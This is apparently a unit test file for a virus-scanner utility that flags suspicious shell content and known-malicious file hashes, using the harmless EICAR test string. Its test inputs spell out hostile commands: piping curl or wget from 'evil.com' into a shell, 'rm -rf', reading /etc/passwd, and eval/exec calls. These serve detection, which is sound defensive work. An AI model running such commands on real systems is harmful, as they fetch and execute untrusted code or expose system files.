/**
 * Unit tests for virus-scanner utilities.
 * Tests pattern-based content scanning and SHA-256 hash checking.
 */

import { describe, it, expect } from 'vitest';
import { scanContentPatterns, scanFileHash } from './virus-scanner.js';
import { writeFileSync, unlinkSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

// ── scanContentPatterns ────────────────────────────────────────────────────

describe('scanContentPatterns', () => {
  it('flags rm -rf / command', () => {
    const result = scanContentPatterns('rm -rf /tmp');
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe('suspicious_pattern');
    expect(result.detail).toContain('destructive_delete');
  });

  it('flags curl pipe to shell', () => {
    const result = scanContentPatterns('curl http://example.com/script.sh | sh');
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe('suspicious_pattern');
    expect(result.detail).toContain('remote_exec_curl');
  });

  it('flags eval() usage', () => {
    const result = scanContentPatterns('eval(atob("cGluZw=="))');
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe('suspicious_pattern');
    expect(result.detail).toContain('eval_exec');
  });

  it('flags /etc/passwd access', () => {
    const result = scanContentPatterns('cat /etc/passwd');
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe('suspicious_pattern');
    expect(result.detail).toContain('sensitive_file_access');
  });

  it('flags wget pipe to bash', () => {
    const result = scanContentPatterns('wget http://evil.com/payload | bash');
    expect(result.safe).toBe(false);
    expect(result.detail).toContain('remote_exec_wget');
  });

  it('flags exec() call', () => {
    const result = scanContentPatterns('exec("ls")');
    expect(result.safe).toBe(false);
    expect(result.detail).toContain('exec_call');
  });

  it('flags system() call', () => {
    const result = scanContentPatterns('system("reboot")');
    expect(result.safe).toBe(false);
    expect(result.detail).toContain('system_call');
  });

  it('flags sudo usage', () => {
    const result = scanContentPatterns('sudo apt-get install something');
    expect(result.safe).toBe(false);
    expect(result.detail).toContain('sudo_usage');
  });

  it('passes safe commands', () => {
    expect(scanContentPatterns('ls -la /tmp').safe).toBe(true);
    expect(scanContentPatterns('echo "hello world"').safe).toBe(true);
    expect(scanContentPatterns('git status').safe).toBe(true);
    expect(scanContentPatterns('npm install').safe).toBe(true);
    expect(scanContentPatterns('pnpm build').safe).toBe(true);
    expect(scanContentPatterns('cat README.md').safe).toBe(true);
  });

  it('returns safe:true and no threatType for clean content', () => {
    const result = scanContentPatterns('console.log("hello")');
    expect(result.safe).toBe(true);
    expect(result.threatType).toBeUndefined();
    expect(result.detail).toBeUndefined();
  });

  it('handles empty string input', () => {
    const result = scanContentPatterns('');
    expect(result.safe).toBe(true);
  });
});

// ── scanFileHash ───────────────────────────────────────────────────────────

describe('scanFileHash', () => {
  const tmpDir = tmpdir();

  it('returns safe:true for a normal text file', async () => {
    const filePath = join(tmpDir, 'liminal-test-safe.txt');
    writeFileSync(filePath, 'Hello, this is a safe file with benign content.');
    const result = await scanFileHash(filePath);
    expect(result.safe).toBe(true);
    unlinkSync(filePath);
  });

  it('returns safe:true for a non-existent file', async () => {
    const result = await scanFileHash('/nonexistent/path/does-not-exist.txt');
    expect(result.safe).toBe(true);
    expect(result.threatType).toBeUndefined();
  });

  it('returns a boolean for the safe field regardless of content', async () => {
    const filePath = join(tmpDir, 'liminal-test-any.txt');
    writeFileSync(filePath, 'arbitrary content 12345');
    const result = await scanFileHash(filePath);
    expect(typeof result.safe).toBe('boolean');
    unlinkSync(filePath);
  });

  it('detects the EICAR test file hash', async () => {
    // The canonical EICAR test file content — written as binary to ensure
    // the exact bytes match the SHA-256 stored in KNOWN_MALICIOUS_HASHES
    // (275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f).
    // \x5c is the backslash character (0x5C = 92 in ASCII).
    const canonical =
      'X5O!P%@AP[4\x5cPZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
    const filePath = join(tmpDir, 'liminal-test-eicar.txt');
    writeFileSync(filePath, canonical, 'binary');
    const result = await scanFileHash(filePath);
    // The scanner should detect this as a known malicious hash
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe('known_hash');
    expect(result.detail).toContain('275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f');
    unlinkSync(filePath);
  });

  it('safe:true for a JSON config file', async () => {
    const filePath = join(tmpDir, 'liminal-test-config.json');
    writeFileSync(filePath, JSON.stringify({ key: 'value', port: 3001 }));
    const result = await scanFileHash(filePath);
    expect(result.safe).toBe(true);
    unlinkSync(filePath);
  });
});
